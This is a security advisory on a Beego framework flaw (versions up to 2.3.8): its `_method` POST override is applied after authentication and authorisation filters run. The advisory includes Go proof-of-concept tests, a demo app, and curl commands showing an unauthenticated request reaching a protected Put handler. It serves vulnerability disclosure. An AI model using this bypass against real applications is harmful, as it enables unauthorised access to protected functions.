# Beego Method Override Could Bypass Before Filters <=2.3.8

# Overview

The processing of the method override parameter (`_method`) occurred after the Beego router had executed `Before*` filters, which could introduce a broken authorisation or authentication vulnerability in an application.

The conditions of exploitation depended on the existence of a controller that had a `POST` route that was accessible to an attacker and either a method called `Put` or `Delete` that had a different set of request filters to the `POST` route.

# Description

The `routerTypeBeego` Beego router type supports a `_method` input parameter for `POST` requests to change the method of a request. [Based from the documentation](https://github.com/beego/beedoc/blob/ccda399f138793458a5ebcf3aafed604a334718b/tr-TR/mvc/controller/controller.md#using-put-method-in-http-form), this method override functionality was likely introduced to support `PUT` and `DELETE` request methods for XHTML 1.x forms.

The issue with this method override functionality is that it occurred after the router had completed processing the `BeforeStatic` `BeforeRouter`, `BeforeExec` filters, which is where authorisation and authentication checks would likely occur.

If a controller had an attacker accessible `POST` route and either a method called `Put` or `Delete` that was protected by an authentication/authorisation filter, then an attacker could bypass the validation by using the `_method` input parameter.

# Proof of Concept

The following code snippet shows that the `_method` override is applied after the `Before*` router filters for incoming requests `POST` to a `routerTypeBeego` router type.

[*`beego/server/web/router.go`*](https://github.com/beego/beego/blob/a21efb561349426790388c030e4732f41db63f2f/server/web/router.go#L1158-L1175)
```go
func (p *ControllerRegister) serveHttp(ctx *beecontext.Context) {
	...	// filter for static file
	if len(p.filters[BeforeStatic]) > 0 && p.execFilter(ctx, urlPath, BeforeStatic) { <1>
		goto Admin
	}
	...
	if len(p.filters[BeforeRouter]) > 0 && p.execFilter(ctx, urlPath, BeforeRouter) { <1>
		goto Admin
	}
	...
	// execute middleware filters
	if len(p.filters[BeforeExec]) > 0 && p.execFilter(ctx, urlPath, BeforeExec) { <1>
		goto Admin
	}

	// check policies
	if p.execPolicy(ctx, urlPath) {
		goto Admin
	}

	if routerInfo != nil {
		if routerInfo.routerType == routerTypeRESTFul {
			if _, ok := routerInfo.methods[r.Method]; ok {
				isRunnable = true
				routerInfo.runFunction(ctx)
			} else {
				exception("405", ctx)
				goto Admin
			}
		} else if routerInfo.routerType == routerTypeHandler {
			isRunnable = true
			routerInfo.handler.ServeHTTP(ctx.ResponseWriter, ctx.Request)
		} else { <2>
			runRouter = routerInfo.controllerType
			methodParams = routerInfo.methodParams
			method := r.Method
			if r.Method == http.MethodPost && ctx.Input.Query("_method") == http.MethodPut { <3>
				method = http.MethodPut
			}
			if r.Method == http.MethodPost && ctx.Input.Query("_method") == http.MethodDelete { <3>
				method = http.MethodDelete
			}
			if m, ok := routerInfo.methods[method]; ok {
				runMethod = m
			} else if m, ok = routerInfo.methods["*"]; ok {
				runMethod = m
			} else {
				runMethod = method
			}
		}
	}
	...
```
1. The  `BeforeStatic` `BeforeRouter`, `BeforeExec` filters are processed before the `_method` override is applied.
2. For all other router types that are not `routerTypeRESTFul` or `routerTypeHandler`.
3. If the incoming request is `POST` and the `_method` parameter is either `PUT` or `DELETE` then it overrides the request method.

To demonstrate this vulnerability, the following test case code and test outputs were provided to the Beego development team that demonstrates how the `_method` override could be abused to bypass authentication and authorisation.

```go
type TestFilterBypassController struct {
	web.Controller
}

func (tc *TestFilterBypassController) Post() {
	tc.Ctx.Output.Body([]byte("post"))
}

func (tc *TestFilterBypassController) Put() {
	tc.Ctx.Output.Body([]byte("put"))
}

func testRequestCheckResp(t *testing.T, handler *web.ControllerRegister, user string, path string, method string, code int, eb string) {
	r, _ := http.NewRequest(method, path, nil)
	r.SetBasicAuth(user, "123")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, r)

	if w.Code != code {
		t.Errorf("%s, %s, %s, status code: %d, supposed to be %d", user, path, method, w.Code, code)
	}

	if w.Body.String() != eb {
		t.Errorf("%s, %s, %s, reponse body: %s, supposed to be %s", user, path, method, w.Body.String(), eb)
	}
}

func TestAuthzFilterBypass(t *testing.T) {
	handler := web.NewControllerRegister()

	handler.InsertFilter("*", web.BeforeRouter, auth.Basic("alice", "123"))
	// authz_policy_demo_bypass.csv was just "p, alice, /endpoint, POST"
	e := casbin.NewEnforcer("authz_model.conf", "authz_policy_demo_bypass.csv")
	handler.InsertFilter("*", web.BeforeRouter, NewAuthorizer(e))

	handler.Add("/endpoint", &TestFilterBypassController{}, web.WithRouterMethods(&TestFilterBypassController{}, "post:Post"))
	handler.Add("/endpoint", &TestFilterBypassController{}, web.WithRouterMethods(&TestFilterBypassController{}, "put:Put"))

	testRequestCheckResp(t, handler, "alice", "/endpoint", "POST", 200, "post")
	testRequestCheckResp(t, handler, "alice", "/endpoint", "PUT", 403, "403 Forbidden\n")
	testRequestCheckResp(t, handler, "alice", "/endpoint?_method=PUT", "POST", 403, "403 Forbidden\n") // Bypass happens here
}

func TestAuthFilterBypass(t *testing.T) {
	handler := web.NewControllerRegister()

	handler.InsertFilter("/admin/*", web.BeforeRouter, auth.Basic("alice", "123"))

	handler.Add("/endpoint", &TestFilterBypassController{}, web.WithRouterMethods(&TestFilterBypassController{}, "post:Post"))
	handler.Add("/admin/endpoint", &TestFilterBypassController{}, web.WithRouterMethods(&TestFilterBypassController{}, "put:Put"))

	testRequestCheckResp(t, handler, "anon", "/endpoint", "POST", 200, "post")
	testRequestCheckResp(t, handler, "anon", "/admin/endpoint", "PUT", 401, "401 Unauthorized\n")
	testRequestCheckResp(t, handler, "anon", "/endpoint?_method=PUT", "POST", 200, "post") // Bypass happens here
}
```

*Test output for the `TestAuthzFilterBypass` test case.*
```
=== RUN   TestAuthzFilterBypass
    /home/ghostccamm/Documents/Research/beego/beego/server/web/filter/authz/authz_test.go:130: alice, /endpoint?_method=PUT, POST, status code: 200, supposed to be 403
    /home/ghostccamm/Documents/Research/beego/beego/server/web/filter/authz/authz_test.go:134: alice, /endpoint?_method=PUT, POST, reponse body: put, supposed to be 403 Forbidden <1>
--- FAIL: TestAuthzFilterBypass (0.00s)
```
1. Response body returned `put`, indicating the `Put()` controller method is executed that the test user was not authorised to access.

*Test output for the `TestAuthFilterBypass` test case.*
```
=== RUN   TestAuthFilterBypass
    /home/ghostccamm/Documents/Research/beego/beego/server/web/filter/authz/authz_test.go:134: anon, /endpoint?_method=PUT, POST, reponse body: put, supposed to be post <1>
--- FAIL: TestAuthFilterBypass (0.00s)
```
1. The `Put()` controller method was executed, which should have only been accessible from the `/admin/endpoint` route that required authentication.

The following example application and demonstration was also provided to the Beego development team.

```go
package main

import (
	"github.com/beego/beego/v2/server/web"
	"github.com/beego/beego/v2/server/web/filter/auth"
)

type FilterBypassController struct {
	web.Controller
}

func (tc *FilterBypassController) Post() {
	tc.Ctx.Output.Body([]byte("public endpoint"))
}

func (tc *FilterBypassController) Put() {
	tc.Ctx.Output.Body([]byte("auth endpoint"))
}

func main() {
	// Only /endpoint (Post method) should be accessible without authentication
	web.InsertFilter("/admin/*", web.BeforeRouter, auth.Basic("alice", "secretpass"))

	web.CtrlPost("endpoint", (*FilterBypassController).Post)
	web.CtrlPut("admin/endpoint", (*FilterBypassController).Put)

	web.Run()
}
```

```terminal
$ curl -X PUT 'http://127.0.0.1:8080/admin/endpoint'
401 Unauthorized

$ curl -X POST 'http://127.0.0.1:8080/endpoint?_method=PUT'
auth endpoint
```

# Impact

This method override issue could potentially be exploited to bypass authentication and authorisation validation checks in Beego applications, since these validation checks occur in `Before*` filters.

# Timeline

* 22-May-2025 - Vulnerability was reported to Beego. No response was received and the report was left untriaged.
* 17-Jul-2025 - Follow up was sent to Beego. No response was received and the report was left untriaged.
* 22-Sep-2025 - 1 week notice of public disclosure was sent to Beego. No response was received and the report was left untriaged.
* 29-Sep-2025 - Public disclosure of this vulnerability.

# Discovered
- May 2025, Alex Brown, elttam